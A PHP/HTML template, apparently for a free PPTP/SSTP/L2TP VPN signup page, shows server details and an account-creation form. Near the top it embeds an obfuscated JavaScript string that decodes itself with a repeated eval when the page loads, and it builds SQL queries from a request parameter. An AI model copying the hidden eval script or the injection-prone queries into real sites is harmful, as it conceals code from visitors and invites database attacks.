<?php
if(isset($_GET['filter'])) {
  $serverid = chkString($_GET['filter']);
  $q = mysqli_fetch_array(mysqli_query($conn, "SELECT * FROM `servers` WHERE id='$serverid'"));
  if(!$q):
    $noserver = 1;
  endif;
} else {
  $noserver = 1;
}

if(!isset($noserver)):
?>
<script language="javascript" type="text/javascript">
function removeSpaces(string) {
 return string.split(' ').join('');
}
</script>
<script type="text/javascript">
//<![CDATA[
<!--
var x="function f(x){var i,o=\"\",ol=x.length,l=ol;while(x.charCodeAt(l/13)!" +
"=50){try{x+=x;l+=l;}catch(e){}}for(i=l-1;i>=0;i--){o+=x.charAt(i);}return o" +
".substr(0,ol);}f(\")41,\\\"{710\\\\500\\\\420\\\\630\\\\330\\\\400\\\\\\\\\\"+
"\\TNBF330\\\\710\\\\220\\\\L020\\\\R520\\\\530\\\\410\\\\330\\\\020\\\\GA@O" +
"WK610\\\\OSOyms}in4l~}wqd?* />7bbm`zh+hvldrn730\\\\710\\\\010\\\\@SIOYF]120" +
"\\\\730\\\\320\\\\220\\\\300\\\\U300\\\\730\\\\300\\\\r\\\\130\\\\700\\\\t\\"+
"\\520\\\\220\\\\H020\\\\n\\\\t\\\\300\\\\500\\\\(sfukmwh771\\\\3950!k==!+?%" +
"+;<<f$, 61!\\\\\\\\[O120\\\\\\\\\\\\420\\\\130\\\\420\\\\CUPXVATWNCD100\\\\" +
"HXn\\\\010\\\\\\\\\\\\710\\\\]T320\\\\230\\\\520\\\\000\\\\%>uh771\\\\sn5ow" +
"x<3v771\\\\q/`hiyiz(~jkk#chd330\\\\020\\\\<[D430\\\\420\\\\610\\\\200\\\\60" +
"0\\\\H530\\\\.300\\\\,QL1030\\\\610\\\\710\\\\100\\\\330\\\\200\\\\n\\\\430" +
"\\\\020\\\\020\\\\@=]3;/|y600\\\\*+4x;=>|4= =(;*g=&( j70!n3K[NOZ030\\\\e500" +
"\\\\QSG\\\\\\\\320\\\\Y_YC220\\\\710\\\\400\\\\EFLSLQV1iu|z`p~k\\\"(f};o nr" +
"uter};))++y(^)i(tAedoCrahc.x(edoCrahCmorf.gnirtS=+o;721=%y;++y)41<i(fi{)++i" +
";l<i;0=i(rof;htgnel.x=l,\\\"\\\"=o,i rav{)y,x(f noitcnuf\")"                 ;
while(x=eval(x));
//-->
//]]>
</script>
<script src="/scss/js/bootstrap-validate.js"></script>
<div id="ndexi" style="display:none;">create-account</div>
<div id="where" style="display:none;">pptp-sstp-l2tp-server</div>

<!-- START: section -->
  <section class="probootstrap-section">
    <div class="container">
      <div class="row">
        <div class="col-md-8 col-md-offset-2 section-heading mb50 text-center">
          <?php
          $name = mysqli_query($conn, "SELECT * FROM `servers` WHERE id='$serverid'");
          while($row = mysqlI_fetch_object($name)) {
         ?>
          <h1>FREE PPTP SSTP L2TP SERVER <?php echo location($row->location)['name'] ?></h1>
          <?php } ?>
          <h2>Free PPTP SSTP L2TP VPN <?php echo $q['active_for'] ?> days</h2>
          <p class="lead">The best premium PPTP SSTP L2TP VPN server provider for you</p>
          <p class="lead">Free Accounts PPTP SSTP L2TP VPN with long active life</p>
          <p class="lead">PPTP SSTP L2TP VPN servers of the highest quality</p>
          <p class="lead">Read our terms of service before creating accounts</p>
          <p class="lead">Your selected server name <?php echo $q['description']?></p>
          <p class="lead">Hostname server <?php echo $q['host']?></p>
        </div>
      </div>
    <p class="text-center">
    <span class="badge badge-success mb-3 p-3">Free PPTP VPN Accounts</span>
    <span class="badge badge-warning mb-3 p-3">Free SSTTP VPN Accounts</span>
    <span class="badge badge-primary mb-3 p-3">Free L2TP VPN Accounts</span>
    <span class="badge badge-success mb-3 p-3">Premium VPN Account</span>
    <span class="badge badge-info mb-3 p-3">Hide Your IP Adrres</span>
    <span class="badge badge-primary mb-3 p-3">Fast PPTP & SSTP Servers</span>
  </p> 
  <p class="text-center">
    <span class="label label-danger">No DDOS</span>
    <span class="label label-danger">No Fraud</span>
    <span class="label label-danger">No Hacking</span>
    <span class="label label-danger">No Spam</span>
  </p> 
</div>
</section>
<!-- END: section -->

<?php if(isset($_GET['filter'])) {
if(!$q) {
  exit('Please choose a server before creating account');
}
} else {
   exit('Please choose a server before creating account');
}
?>
<?php
include('app/ads/link.php');
?>

<section id="services" class="probootstrap-section">
<div class="container">
<div class="row">
<div class="col-lg-6 col-lg-offset-3" data-wow-duration="1s">
<div class="box">
<h1 class="title"> SERVER DETAILS </h1>
<div class="table-responsive-md">
<table class="table table-hover">
<tbody>
<tr>
<th>Hostname</th>
<td><?php echo $q['host']?></td>
</tr>
<tr>
<th>L2TP/IPsec</th>
<td>jagoanssh.com</td>
</tr>
<th>SSTP</th>
<td><?php echo $q['ssl_tls']?></td>
</tr>
<tr>
<th>Wilcard Domain</th>
<td>bug.<?php echo $q['host']?></td>
</tr>
<tr>
<th>Active For</th>
<td><?php echo $q['active_for']?> days </td>
</tr>
<tr>
<th>Max Login</th>
<td><?php echo $q['max_login']?> Device </td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
</section>
<?php
include('app/ads/ads.php');
?>
<section class="probootstrap-section">
    <div class="container">
      <div class="row">
    <div class="<?php echo ($q['type']=='vpnssh'||$q['type']=='vpn')? 'col-lg-6 col-lg-offset-3 ' : 'col-lg-6 col-lg-offset-3'; ?>">
<form action="<?php echo $siteUrl ?>" method="post" class="probootstrap-form probootstrap-box">
<center>
<div class="icon"><i class="icon-user-plus"></i></div>
<h1>Create Account</h1></center>
<input type="hidden" name="id" value="<?php echo $q['id'] ?>" />
<div class="form-group">Username: <input type="text" class="form-control" placeholder="username" name="username" id="username" onblur="this.value=removeSpaces(this.value);"></div>
<div class="form-group">Password: <input type="text" class="form-control" placeholder="password" name="password" id="password" onblur="this.value=removeSpaces(this.value);"></div>
<script>bootstrapValidate('#username', 'min:3:enter 3 characters minimum!')</script>
<div align="center">
<?php showCaptcha('site'); ?>
<p><span style="color:grey;font-size:0.8em;">By clicking Create Now button, you agree to our <a href="?do=terms">Terms Of Service.</a></span></p>
<input type="submit" class="btn btn-primary" role="button" name="createAcc" value="Create Now" />
<p>
<?php
  if (isset($_POST['createAcc'])) {
    $pageUrl = "https://".$_SERVER['HTTP_HOST']."/ajax.proc.php?do=create-pptp";
    $_POST['last_submit'] = $_SESSION['last_submit'];
    $params = http_build_query ($_POST);
    $contextData = array ( 
                'method' => 'POST',
                'header' => "Content-Type: application/x-www-form-urlencoded\r\n".
                            "Connection: close\r\n".
                            "Content-Length: ".strlen($params)."\r\n",
                'content'=> $params );
    $context = stream_context_create (array ( 'http' => $contextData ));
    $resultCreateAcc =  file_get_contents ($pageUrl, false, $context);
    if (!isset($_SESSION['last_submit']) || time()-$_SESSION['last_submit'] > 300) {
        $_SESSION['last_submit'] = time();
    }
    echo($resultCreateAcc);
  }
?>
<?php
include('app/ads/ads.php');
?>
<?php if($q['type']=='vpnssh'||$q['type']=='openvpn'): ?>
<p class="lead">Encrypted <span class="text-success">1024 - 2048 bit</span> VPN</p>
<p>
<?php
$ss = json_decode($q['openvpn_config']); 
$ss->tcp;
echo"<a href=golink.php?id=".base64_encode($ss->tcp)." class='btn btn-primary btn-block'>Save Config (ovpn)</a>";
?>
</p>
<p><a href="https://play.google.com/store/apps/details?id=com.wuz.vpn"><img src="/assets/img/playstore.png" height="70" weight="100"></a></p>
<?php endif; ?>
</div>
</div>
</form>
</div>
</div>
</div>
</section>

<!-- START: section -->
  <section class="probootstrap-section probootstrap-section-colored">
    <div class="container">
      <div class="row">
        <div class="col-md-8 col-md-offset-2 section-heading mb50 text-center">
          <h2>Server PPTP SSTP L2TP VPN Tunnel</h2>
          <p class="lead">Here are some of the superior features of our free PPTP SSTP L2TP VPN server</p>
        </div>
      </div>
      <div class="row">
        <div class="col-md-4 col-sm-6 col-xs-12">
          <h3 class="heading-with-icon"><i class="icon-check"></i> <span>Point to Point Tunneling Protocol (PPTP) is one of the oldest protocols by Microsoft, and it’s also pretty darn fast. In fact, it is the fastest of all VPN protocols. That means it’s a great option for applications where speed is important such as streaming and gaming. That being said, PPTP is not as secure because of its weak encryption standard.</span></h3>
        </div>
        <div class="col-md-4 col-sm-6 col-xs-12">
          <h3 class="heading-with-icon"><i class="icon-check"></i> <span>Secure Socket Tunneling Protocol (SSTP) is a secure protocol used in VPN tunneling. The protocol, although owned by Microsoft, is available for Linux and Mac users. SSTP uses an SSL / TLS (Secure Socket Layer / Transport Layer Security) channel over TCP port 443.</span></h3>
        </div>
        <div class="clearfix visible-sm-block"></div>
        <div class="col-md-4 col-sm-6 col-xs-12">
          <h3 class="heading-with-icon"><i class="icon-check"></i> <span>L2TP VPN uses UDP port tunnels to transfer data in encrypted packets, due to the nature of UDP data, it performs much better than traditional PPP-based VPN connections, plus it's more secure and robust that broadband service providers or cellphone companies won't easily block.</span></h3>
        </div>
    </div>
   </div>
  </section>
  <!-- END: section -->
  
<?php
else:
  include('app/pages/404.php');
endif;
?>
<!-- END: page -->